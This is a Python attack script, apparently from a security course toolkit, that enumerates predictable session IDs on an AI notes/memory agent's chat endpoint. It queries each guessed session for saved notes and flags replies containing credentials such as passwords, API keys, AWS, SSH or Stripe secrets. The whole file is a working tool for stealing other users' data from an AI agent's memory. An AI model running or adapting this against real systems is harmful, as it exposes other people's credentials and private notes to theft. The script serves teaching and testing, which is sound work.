#!/usr/bin/env python3
"""
session_enum.py — AI Agent Session Enumerator
AISuite Toolkit — OSAI Chapter 3.4.2

Brute-forces predictable session IDs against a notes/memory agent.
Flags sessions containing sensitive keywords.

Usage:
    python3 session_enum.py
    python3 session_enum.py --target http://192.168.129.24:8009/chat
    python3 session_enum.py --target http://192.168.129.24:8018/chat --prefix MC --date 20260325 --days 14 --max 20
"""

import argparse
import requests
import json
from datetime import datetime, timedelta

# ── Defaults ──────────────────────────────────────────────────────────────────
DEFAULT_TARGET  = "http://192.168.50.24:8009/chat"
DEFAULT_PREFIX  = "MC"
DEFAULT_DATE    = datetime.now().strftime("%Y%m%d")
DEFAULT_DAYS    = 14
DEFAULT_MAX     = 20

KEYWORDS = [
    "password", "token", "key", "secret", "credential",
    "api_key", "access_key", "ssh", "private", "jira",
    "aws", "slack", "stripe", "sendgrid", "redis",
]

EMPTY = [
    "haven't saved", "no notes", "no reminders", "nothing stored",
    "haven't stored", "no saved", "currently have no",
    "couldn't find", "unable to find", "no entries",
    "i was unable", "no information",
]

# ── ANSI colours ──────────────────────────────────────────────────────────────
RED    = "\033[91m"
GREEN  = "\033[92m"
YELLOW = "\033[93m"
CYAN   = "\033[96m"
DIM    = "\033[2m"
BOLD   = "\033[1m"
RESET  = "\033[0m"

def main():
    parser = argparse.ArgumentParser(description="Session Enumerator — OSAI Ch 3.4.2")
    parser.add_argument("--target",  default=DEFAULT_TARGET,  help="Chat endpoint URL")
    parser.add_argument("--prefix",  default=DEFAULT_PREFIX,  help="Session ID prefix (default: MC)")
    parser.add_argument("--date",    default=DEFAULT_DATE,     help="Start date YYYYMMDD (default: today)")
    parser.add_argument("--days",    type=int, default=DEFAULT_DAYS, help="Days back to scan (default: 14)")
    parser.add_argument("--max",     type=int, default=DEFAULT_MAX,  help="Max counter per day (default: 20)")
    parser.add_argument("--message", default="What notes do I have saved?", help="Query message")
    parser.add_argument("--output",  help="Save results to JSON file")
    args = parser.parse_args()

    print(f"""
{RED}{BOLD}╔══════════════════════════════════════════════════════╗
║           Session Enumerator v1.0                    ║
║     AISuite Toolkit — OSAI Chapter 3.4.2             ║
╚══════════════════════════════════════════════════════╝{RESET}
  {CYAN}Target:{RESET}  {args.target}
  {CYAN}Pattern:{RESET} {args.prefix}-YYYYMMDD-NNNN
  {CYAN}Scanning:{RESET} {args.days} days × {args.max} counters = {args.days * args.max} requests
""")

    current_date = datetime.strptime(args.date, "%Y%m%d")
    end_date     = current_date - timedelta(days=args.days)

    sensitive = []
    active    = []
    total     = 0

    d = current_date
    while d >= end_date:
        date_str = d.strftime("%Y%m%d")
        for i in range(1, args.max + 1):
            sid = f"{args.prefix}-{date_str}-{i:04d}"
            total += 1
            try:
                r = requests.post(
                    args.target,
                    json={"message": args.message, "session_id": sid},
                    timeout=30
                )
                resp = r.json().get("response", "")

                # Skip empty sessions
                if any(e in resp.lower() for e in EMPTY):
                    continue

                # Flag sensitive
                if any(kw in resp.lower() for kw in KEYWORDS):
                    print(f"\n  {RED}[!] SENSITIVE — {sid}:{RESET}")
                    print(f"      {resp[:300]}")
                    sensitive.append({"session_id": sid, "data": resp})
                else:
                    print(f"  {GREEN}[+]{RESET} {sid}: {resp[:100]}...")
                    active.append({"session_id": sid, "data": resp})

            except requests.exceptions.Timeout:
                print(f"  {DIM}[T] {sid} — timeout{RESET}")
            except Exception as e:
                print(f"  {DIM}[E] {sid} — {e}{RESET}")

        d -= timedelta(days=1)

    # ── Summary ────────────────────────────────────────────────────────────────
    print(f"\n  {BOLD}{'─'*54}{RESET}")
    print(f"  {BOLD}SUMMARY{RESET}")
    print(f"  {CYAN}Total requests:{RESET}    {total}")
    print(f"  {GREEN}Active sessions:{RESET}  {len(active) + len(sensitive)}")
    print(f"  {RED}Sensitive hits:{RESET}   {len(sensitive)}")

    if sensitive:
        print(f"\n  {RED}{BOLD}SENSITIVE SESSIONS:{RESET}")
        for s in sensitive:
            print(f"\n  {RED}►{RESET} {s['session_id']}")
            print(f"    {s['data'][:400]}")

    # ── Save output ────────────────────────────────────────────────────────────
    if args.output:
        results = {
            "target":          args.target,
            "scan_date":       args.date,
            "days_back":       args.days,
            "max_counter":     args.max,
            "total_requests":  total,
            "active_sessions": active + sensitive,
            "sensitive":       sensitive,
        }
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\n  {GREEN}[+] Results saved to: {args.output}{RESET}")

if __name__ == "__main__":
    main()
